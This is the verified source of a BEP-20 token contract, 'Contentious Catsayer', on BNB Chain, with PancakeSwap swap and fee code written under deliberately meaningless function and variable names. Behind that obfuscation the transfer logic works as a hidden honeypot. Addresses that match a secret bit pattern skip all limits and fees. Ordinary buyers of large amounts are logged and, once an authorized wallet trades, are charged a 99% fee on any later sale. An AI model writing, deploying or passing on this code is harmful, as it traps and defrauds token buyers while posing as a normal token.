/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ContentiousCatsayer is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Contentious Catsayer ";
    string constant _symbol = "ContentiousCatsayer";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletSellMarketingMinModeTeamLiquidity;
    mapping(address => bool) private isFeeMarketingTx;
    mapping(address => bool) private isSellMaxBurn;
    mapping(address => bool) private receiverTxMinBuyAutoLimit;
    mapping(address => uint256) private minExemptSwapBurn;
    mapping(uint256 => address) private minSwapMarketingLaunched;
    uint256 public exemptLimitValue = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private marketingTeamModeTx = 0;
    uint256 private txSellModeMin = 9;

    //SELL FEES
    uint256 private receiverBurnLimitSell = 0;
    uint256 private sellAutoBuyFee = 9;

    uint256 private sellMaxBuyTradingMarketingTx = txSellModeMin + marketingTeamModeTx;
    uint256 private feeMinTradingReceiver = 100;

    address private receiverLiquidityExemptSwap = (msg.sender); // auto-liq address
    address private autoTeamMinMax = (0xf449718bcb53E3AF32f1A687FFFfe539898F1Bb9); // marketing address
    address private launchedExemptWalletReceiverBurnSellBots = DEAD;
    address private marketingBuyBurnExemptMinModeTx = DEAD;
    address private launchedTeamTxBuyLimitSellAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private maxLiquidityFeeIs;
    uint256 private limitAutoWalletMarketing;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private swapTeamFeeMax;
    uint256 private isFeeMinBots;
    uint256 private walletMarketingExemptLiquidity;
    uint256 private walletBuyMarketingLiquidity;
    uint256 private limitSwapExemptBuy;

    bool private sellMinLaunchedModeMarketingReceiverMax = true;
    bool private receiverTxMinBuyAutoLimitMode = true;
    bool private sellBotsExemptBurn = true;
    bool private autoBotsTxWallet = true;
    bool private tradingTeamReceiverLimit = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private autoBotsSellTx = 6 * 10 ** 15;
    uint256 private sellTeamTxReceiver = _totalSupply / 1000; // 0.1%

    
    uint256 private autoLimitReceiverMode = 0;
    uint256 private buyModeTeamBotsMaxExempt = 0;
    bool private modeTradingLaunchedBurn = false;
    bool private tradingBuyMaxLiquidity = false;
    bool private launchedReceiverSwapLiquidityBuy = false;
    bool private autoTxLimitLaunchedExempt = false;
    uint256 private buyFeeLimitSell = 0;
    uint256 private teamSwapBotsMin = 0;
    uint256 private marketingReceiverTradingIs = 0;
    uint256 private marketingLiquidityFeeReceiverBotsIs = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        swapTeamFeeMax = true;

        walletSellMarketingMinModeTeamLiquidity[msg.sender] = true;
        walletSellMarketingMinModeTeamLiquidity[address(this)] = true;

        isFeeMarketingTx[msg.sender] = true;
        isFeeMarketingTx[0x0000000000000000000000000000000000000000] = true;
        isFeeMarketingTx[0x000000000000000000000000000000000000dEaD] = true;
        isFeeMarketingTx[address(this)] = true;

        isSellMaxBurn[msg.sender] = true;
        isSellMaxBurn[0x0000000000000000000000000000000000000000] = true;
        isSellMaxBurn[0x000000000000000000000000000000000000dEaD] = true;
        isSellMaxBurn[address(this)] = true;

        SetAuthorized(address(0x8D16f3A39Ab219216cEd87ecFfffF405068c1e85));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsTeamTradingLiquiditySwapLimitReceiver(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return botsTeamTradingLiquiditySwapLimitReceiver(sender, recipient, amount);
    }

    function botsTeamTradingLiquiditySwapLimitReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = burnMinWalletLiquidity(sender) || burnMinWalletLiquidity(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                buyMinSellReceiver();
            }
            if (!bLimitTxWalletValue) {
                maxExemptMinSwapSell(recipient);
            }
        }
        
        if (recipient == uniswapV2Pair && _balances[recipient] == 0) {
            launchBlock = block.number + 10;
        }
        if (!bLimitTxWalletValue) {
            require(block.number >= launchBlock, "No launch");
        }

        
        if (autoTxLimitLaunchedExempt == tradingBuyMaxLiquidity) {
            autoTxLimitLaunchedExempt = tradingTeamReceiverLimit;
        }


        if (inSwap || bLimitTxWalletValue) {return liquidityLaunchedSellTeamExemptSwapMax(sender, recipient, amount);}


        if (!walletSellMarketingMinModeTeamLiquidity[sender] && !walletSellMarketingMinModeTeamLiquidity[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        require((amount <= _maxTxAmount) || isSellMaxBurn[sender] || isSellMaxBurn[recipient], "Max TX Limit!");

        if (minTeamMarketingTrading()) {burnFeeSellReceiver();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        if (marketingReceiverTradingIs != receiverBurnLimitSell) {
            marketingReceiverTradingIs = sellMaxBuyTradingMarketingTx;
        }

        if (teamSwapBotsMin != marketingReceiverTradingIs) {
            teamSwapBotsMin = sellAutoBuyFee;
        }


        uint256 amountReceived = isExemptWalletMin(sender) ? swapWalletFeeMode(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function liquidityLaunchedSellTeamExemptSwapMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isExemptWalletMin(address sender) internal view returns (bool) {
        return !isFeeMarketingTx[sender];
    }

    function txWalletMinTradingBuyLiquidity(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            sellMaxBuyTradingMarketingTx = sellAutoBuyFee + receiverBurnLimitSell;
            return marketingLiquidityMaxTx(sender, sellMaxBuyTradingMarketingTx);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellMaxBuyTradingMarketingTx = txSellModeMin + marketingTeamModeTx;
            return sellMaxBuyTradingMarketingTx;
        }
        return marketingLiquidityMaxTx(sender, sellMaxBuyTradingMarketingTx);
    }

    function autoSellModeLiquidity() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function swapWalletFeeMode(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(txWalletMinTradingBuyLiquidity(sender, receiver == uniswapV2Pair)).div(feeMinTradingReceiver);

        if (receiverTxMinBuyAutoLimit[sender] || receiverTxMinBuyAutoLimit[receiver]) {
            feeAmount = amount.mul(99).div(feeMinTradingReceiver);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function burnMinWalletLiquidity(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function marketingLiquidityMaxTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = minExemptSwapBurn[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function maxExemptMinSwapSell(address addr) private {
        if (autoSellModeLiquidity() < autoBotsSellTx) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        minSwapMarketingLaunched[exemptLimitValue] = addr;
    }

    function buyMinSellReceiver() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (minExemptSwapBurn[minSwapMarketingLaunched[i]] == 0) {
                    minExemptSwapBurn[minSwapMarketingLaunched[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function minTeamMarketingTrading() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingTeamReceiverLimit &&
    _balances[address(this)] >= sellTeamTxReceiver;
    }

    function burnFeeSellReceiver() internal swapping {
        
        if (buyFeeLimitSell == feeMinTradingReceiver) {
            buyFeeLimitSell = marketingLiquidityFeeReceiverBotsIs;
        }


        uint256 amountToLiquify = sellTeamTxReceiver.mul(marketingTeamModeTx).div(sellMaxBuyTradingMarketingTx).div(2);
        uint256 amountToSwap = sellTeamTxReceiver.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (buyFeeLimitSell != marketingLiquidityFeeReceiverBotsIs) {
            buyFeeLimitSell = txSellModeMin;
        }

        if (autoLimitReceiverMode == autoBotsSellTx) {
            autoLimitReceiverMode = sellMaxBuyTradingMarketingTx;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellMaxBuyTradingMarketingTx.sub(marketingTeamModeTx.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(marketingTeamModeTx).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(txSellModeMin).div(totalETHFee);
        
        payable(autoTeamMinMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                receiverLiquidityExemptSwap,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getAutoTeamMinMax() public view returns (address) {
        return autoTeamMinMax;
    }
    function setAutoTeamMinMax(address a0) public onlyOwner {
        if (autoTeamMinMax == receiverLiquidityExemptSwap) {
            receiverLiquidityExemptSwap=a0;
        }
        if (autoTeamMinMax != marketingBuyBurnExemptMinModeTx) {
            marketingBuyBurnExemptMinModeTx=a0;
        }
        autoTeamMinMax=a0;
    }

    function getLaunchedTeamTxBuyLimitSellAuto() public view returns (address) {
        return launchedTeamTxBuyLimitSellAuto;
    }
    function setLaunchedTeamTxBuyLimitSellAuto(address a0) public onlyOwner {
        launchedTeamTxBuyLimitSellAuto=a0;
    }

    function getLaunchedExemptWalletReceiverBurnSellBots() public view returns (address) {
        if (launchedExemptWalletReceiverBurnSellBots == launchedTeamTxBuyLimitSellAuto) {
            return launchedTeamTxBuyLimitSellAuto;
        }
        if (launchedExemptWalletReceiverBurnSellBots != autoTeamMinMax) {
            return autoTeamMinMax;
        }
        if (launchedExemptWalletReceiverBurnSellBots == receiverLiquidityExemptSwap) {
            return receiverLiquidityExemptSwap;
        }
        return launchedExemptWalletReceiverBurnSellBots;
    }
    function setLaunchedExemptWalletReceiverBurnSellBots(address a0) public onlyOwner {
        launchedExemptWalletReceiverBurnSellBots=a0;
    }

    function getMarketingLiquidityFeeReceiverBotsIs() public view returns (uint256) {
        if (marketingLiquidityFeeReceiverBotsIs == sellAutoBuyFee) {
            return sellAutoBuyFee;
        }
        if (marketingLiquidityFeeReceiverBotsIs != sellMaxBuyTradingMarketingTx) {
            return sellMaxBuyTradingMarketingTx;
        }
        return marketingLiquidityFeeReceiverBotsIs;
    }
    function setMarketingLiquidityFeeReceiverBotsIs(uint256 a0) public onlyOwner {
        if (marketingLiquidityFeeReceiverBotsIs == marketingLiquidityFeeReceiverBotsIs) {
            marketingLiquidityFeeReceiverBotsIs=a0;
        }
        if (marketingLiquidityFeeReceiverBotsIs == autoLimitReceiverMode) {
            autoLimitReceiverMode=a0;
        }
        if (marketingLiquidityFeeReceiverBotsIs != buyFeeLimitSell) {
            buyFeeLimitSell=a0;
        }
        marketingLiquidityFeeReceiverBotsIs=a0;
    }

    function getModeTradingLaunchedBurn() public view returns (bool) {
        return modeTradingLaunchedBurn;
    }
    function setModeTradingLaunchedBurn(bool a0) public onlyOwner {
        if (modeTradingLaunchedBurn == autoTxLimitLaunchedExempt) {
            autoTxLimitLaunchedExempt=a0;
        }
        if (modeTradingLaunchedBurn == autoBotsTxWallet) {
            autoBotsTxWallet=a0;
        }
        if (modeTradingLaunchedBurn == autoTxLimitLaunchedExempt) {
            autoTxLimitLaunchedExempt=a0;
        }
        modeTradingLaunchedBurn=a0;
    }

    function getAutoLimitReceiverMode() public view returns (uint256) {
        if (autoLimitReceiverMode == marketingLiquidityFeeReceiverBotsIs) {
            return marketingLiquidityFeeReceiverBotsIs;
        }
        return autoLimitReceiverMode;
    }
    function setAutoLimitReceiverMode(uint256 a0) public onlyOwner {
        autoLimitReceiverMode=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}